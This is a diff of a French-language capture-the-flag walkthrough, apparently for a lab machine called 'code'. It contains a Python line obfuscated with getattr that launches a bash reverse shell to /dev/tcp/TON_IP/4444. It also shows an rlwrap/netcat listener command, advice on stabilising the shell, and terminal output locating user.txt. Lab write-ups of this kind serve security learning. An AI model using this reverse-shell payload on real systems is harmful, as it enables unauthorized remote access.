@@ -587,11 +587,23 @@ p = getattr(m, 'po'+'pen')("bash -c 'bash -i >& /dev/tcp/TON_IP/4444 0>&1'")
 print(getattr(p, 're'+'ad')())
 ```
 
-Avant d’exécuter ce code, tu démarres un listener sur ta machine Kali :
+Pour obtenir un shell plus confortable, le listener est lancé avec `rlwrap`, un outil fourni par défaut avec Kali Linux :
 
 ```bash
-nc -lvnp 4444
+rlwrap -cAr nc -lvnp 4444
 ```
+
+> `rlwrap` ajoute l’historique des commandes, l’édition de ligne et une meilleure gestion du terminal interactif.
+>
+> Avec un listener lancé uniquement via `nc -lvnp 4444`, la stabilisation du shell avec `pty.spawn("/bin/bash")` peut provoquer une erreur comme :
+>
+> ```bash
+> bash: [1737: 2 (255)] tcsetattr: Inappropriate ioctl for device
+> ```
+>
+> et provoquer la fermeture du shell avec une commande `exit`.
+
+
 
 À l’exécution via **Run**, la cible se connecte à ton listener et tu obtiens un shell.
 
@@ -599,7 +611,21 @@ Tu stabilises ensuite le shell via la recette {{< recette "stabiliser-reverse-sh
 
 
 
+### Exploration du reverse shell
 
+```bash
+app-production@code:~/app$ find / -name user.txt 2>/dev/null
+find / -name user.txt 2>/dev/null
+/home/app-production/user.txt
+app-production@code:~/app$ cd ..
+cd ..
+app-production@code:~$ ls -l
+ls -l
+total 8
+drwxrwxr-x 6 app-production app-production 4096 Feb 20  2025 app
+-rw-r----- 1 root           app-production   33 May  6 08:05 user.txt
+app-production@code:~$
+```
 
 
 
